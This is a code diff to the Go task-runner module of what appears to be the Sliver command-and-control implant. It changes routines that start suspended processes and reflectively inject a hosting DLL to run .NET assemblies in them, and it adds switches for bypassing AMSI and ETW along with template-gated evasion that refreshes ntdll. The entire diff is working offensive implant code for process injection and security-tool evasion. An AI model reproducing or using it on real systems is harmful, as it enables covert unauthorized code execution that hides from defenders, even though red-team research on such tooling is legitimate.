@@ -22,35 +22,37 @@ package taskrunner
 
 import (
 	"bytes"
-	"fmt"
+	"encoding/binary"
 
 	// {{if .Debug}}
 	"log"
 	// {{else}}{{end}}
 	"os/exec"
+	"runtime"
 	"strings"
 	"time"
 	"unsafe"
-	"runtime"
 
-	"golang.org/x/sys/windows"
-	"github.com/bishopfox/sliver/sliver/version"
-	"github.com/bishopfox/sliver/sliver/syscalls"
-	"github.com/bishopfox/sliver/sliver/evasion"
 	"syscall"
+	// {{if .Evasion}}
+	"github.com/bishopfox/sliver/sliver/evasion"
+	"github.com/bishopfox/sliver/sliver/version"
+
+	// {{end}}
+
+	"github.com/bishopfox/sliver/sliver/syscalls"
+	"golang.org/x/sys/windows"
 )
 
 const (
-	BobLoaderOffset     = 0x00000af0
-	PROCESS_ALL_ACCESS  = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xfff
-	MAX_ASSEMBLY_LENGTH = 1025024
-	STILL_ACTIVE        = 259
+	PROCESS_ALL_ACCESS = windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xfff
+	STILL_ACTIVE       = 259
 )
 
 var (
 	ntdllPath       = "C:\\Windows\\System32\\ntdll.dll" // We make this a var so the string obfuscator can refactor it
 	kernel32dllPath = "C:\\Windows\\System32\\kernel32.dll"
-	CurrentToken windows.Token
+	CurrentToken    windows.Token
 )
 
 func sysAlloc(size int, rwxPages bool) (uintptr, error) {
@@ -183,7 +185,9 @@ func LocalTask(data []byte, rwxPages bool) error {
 	return err
 }
 
-func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeout int32) (string, error) {
+func ExecuteAssembly(hostingDll, assembly []byte, process, params string, amsi bool, etw bool, offset uint32) (string, error) {
+	assemblySizeArr := convertIntToByteArr(len(assembly))
+	paramsSizeArr := convertIntToByteArr(len(params) + 1)
 	err := refresh()
 	if err != nil {
 		return "", err
@@ -192,11 +196,8 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeou
 	log.Println("[*] Assembly size:", len(assembly))
 	log.Println("[*] Hosting dll size:", len(hostingDll))
 	// {{end}}
-	if len(assembly) > MAX_ASSEMBLY_LENGTH {
-		return "", fmt.Errorf("please use an assembly smaller than %d", MAX_ASSEMBLY_LENGTH)
-	}
 	var stdoutBuf, stderrBuf bytes.Buffer
-	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf)
+	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf, true)
 	if err != nil {
 		//{{if .Debug}}
 		log.Println("Could not start process:", process)
@@ -219,22 +220,36 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeou
 	// {{if .Debug}}
 	log.Printf("[*] Hosting DLL reflectively injected at 0x%08x\n", hostingDllAddr)
 	// {{end}}
-	// Total size to allocate = assembly size + 1024 bytes for the args
-	totalSize := uint32(MAX_ASSEMBLY_LENGTH)
-	// Padd arguments with 0x00 -- there must be a cleaner way to do that
-	paramsBytes := []byte(params)
-	padding := make([]byte, 1024-len(params))
-	final := append(paramsBytes, padding...)
-	// Final payload: params + assembly
-	final = append(final, assembly...)
-	assemblyAddr, err := allocAndWrite(final, handle, totalSize)
+
+	// 4 bytes Assembly Size
+	// 4 bytes Params Size
+	// 1 byte AMSI bool  0x00 no  0x01 yes
+	// 1 byte ETW bool  0x00 no  0x01 yes
+	// parameter bytes
+	// assembly bytes
+	payload := append(assemblySizeArr, paramsSizeArr...)
+	if amsi {
+		payload = append(payload, byte(1))
+	} else {
+		payload = append(payload, byte(0))
+	}
+	if etw {
+		payload = append(payload, byte(1))
+	} else {
+		payload = append(payload, byte(0))
+	}
+	payload = append(payload, []byte(params)...)
+	payload = append(payload, '\x00')
+	payload = append(payload, assembly...)
+	totalSize := uint32(len(payload))
+	assemblyAddr, err := allocAndWrite(payload, handle, totalSize)
 	if err != nil {
 		return "", err
 	}
 	// {{if .Debug}}
-	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(final), assemblyAddr)
+	log.Printf("[*] Wrote %d bytes at 0x%08x\n", len(payload), assemblyAddr)
 	// {{end}}
-	threadHandle, err := protectAndExec(handle, hostingDllAddr, uintptr(hostingDllAddr+BobLoaderOffset), assemblyAddr, uint32(len(hostingDll)))
+	threadHandle, err := protectAndExec(handle, hostingDllAddr, uintptr(hostingDllAddr)+uintptr(offset), assemblyAddr, uint32(len(hostingDll)))
 	if err != nil {
 		return "", err
 	}
@@ -245,7 +260,13 @@ func ExecuteAssembly(hostingDll, assembly []byte, process, params string, timeou
 	if err != nil {
 		return "", err
 	}
-	cmd.Process.Kill()
+	err = cmd.Process.Kill()
+	if err != nil {
+		// {{if .Debug}}
+		log.Println("Error kill: %v\n", err)
+		// {{end}}
+		return "", err
+	}
 	return stdoutBuf.String() + stderrBuf.String(), nil
 }
 
@@ -257,7 +278,7 @@ func SpawnDll(procName string, data []byte, offset uint32, args string) (string,
 	var stdoutBuff bytes.Buffer
 	var stderrBuff bytes.Buffer
 	// 1 - Start process
-	cmd, err := startProcess(procName, &stdoutBuff, &stderrBuff)
+	cmd, err := startProcess(procName, &stdoutBuff, &stderrBuff, true)
 	if err != nil {
 		return "", err
 	}
@@ -303,16 +324,16 @@ func SpawnDll(procName string, data []byte, offset uint32, args string) (string,
 }
 
 //SideLoad - Side load a binary as shellcode and returns its output
-func Sideload(procName string, data []byte) (string, error) {
+func Sideload(procName string, data []byte, args string) (string, error) {
 	return SpawnDll(procName, data, 0, "")
 }
 
 // Util functions
-
 func refresh() error {
 	// Hotfix for #114
 	// Somehow this fucks up everything on Windows 8.1
 	// so we're skipping the RefreshPE calls.
+	// {{if .Evasion}}
 	if version.GetVersion() != "6.3 build 9600" {
 		err := evasion.RefreshPE(ntdllPath)
 		if err != nil {
@@ -329,10 +350,11 @@ func refresh() error {
 			return err
 		}
 	}
+	// {{end}}
 	return nil
 }
 
-func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer) (*exec.Cmd, error) {
+func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer, suspended bool) (*exec.Cmd, error) {
 	cmd := exec.Command(proc)
 	cmd.SysProcAttr = &windows.SysProcAttr{
 		Token: syscall.Token(CurrentToken),
@@ -341,6 +363,9 @@ func startProcess(proc string, stdout *bytes.Buffer, stderr *bytes.Buffer) (*exe
 	cmd.Stderr = stderr
 	cmd.SysProcAttr = &windows.SysProcAttr{
 		HideWindow: true,
+	}
+	if suspended {
+		cmd.SysProcAttr.CreationFlags = windows.CREATE_SUSPENDED
 	}
 	err := cmd.Start()
 	if err != nil {
@@ -368,7 +393,7 @@ func waitForCompletion(threadHandle windows.Handle) error {
 		} else {
 			break
 		}
-	} 
+	}
 	return nil
 }
 
@@ -406,4 +431,10 @@ func protectAndExec(handle windows.Handle, startAddr uintptr, threadStartAddr ui
 		return
 	}
 	return
+}
+
+func convertIntToByteArr(num int) []byte {
+	buff := make([]byte, 4)
+	binary.LittleEndian.PutUint32(buff, uint32(num))
+	return buff
 }
